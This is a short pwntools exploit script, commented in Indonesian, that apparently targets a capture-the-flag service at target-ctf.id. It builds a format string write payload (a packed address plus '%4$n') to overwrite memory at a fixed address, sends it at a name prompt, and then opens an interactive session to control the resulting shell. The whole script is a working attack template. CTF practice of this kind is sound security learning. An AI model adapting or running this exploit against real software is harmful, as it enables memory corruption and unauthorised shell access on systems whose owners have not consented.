from pwn import *

# === 1. PENGATURAN TARGET ===
# Pilih salah satu dengan hapus tanda '#'
# io = process('./vuln') # Untuk tes LOKAL
io = remote('target-ctf.id', 1234) # Untuk tes REMOTE (NC)

# Set arsitektur manual biar p32() gak error (i386 = 32bit, amd64 = 64bit)
context.arch = 'i386' 

# ==========================================================
# === 2. LOGIKA EXPLOIT (Sesuai gambar-gambar lu) ===
# ==========================================================

# Skenario: Format String Write (image_eb3a6a.png)
# Kita mau nulis nilai ke alamat 0x0804a018 yang ada di offset 4
target_addr = 0x0804a018
payload = p32(target_addr) + b"%4$n" 

# Kirim payload setelah dapet prompt dari program
io.sendlineafter(b"nama: ", payload)

# ==========================================================
# === 3. SELESAI ===
# ==========================================================

# Interaktif biar bisa kontrol shell-nya kalau berhasil
io.interactive()